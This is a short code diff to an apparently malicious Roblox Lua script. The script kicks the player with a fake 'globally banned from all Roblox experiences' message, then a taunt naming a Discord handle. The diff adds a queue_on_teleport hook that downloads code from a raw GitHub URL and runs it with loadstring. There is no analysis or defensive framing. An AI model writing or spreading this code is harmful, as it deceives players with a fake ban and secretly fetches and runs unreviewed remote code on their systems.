@@ -1,3 +1,7 @@
+if queue_on_teleport then
+    queue_on_teleport("loadstring(game:HttpGet('https://raw.githubusercontent.com/7dksbpxuw8/Use/main/Test'))()")
+end
+
 game.Players.LocalPlayer:Kick("🔒 You are globally banned from all Roblox experiences.")
 wait(2)
 game.Players.LocalPlayer:Kick("Ez discord: spyta666\n")
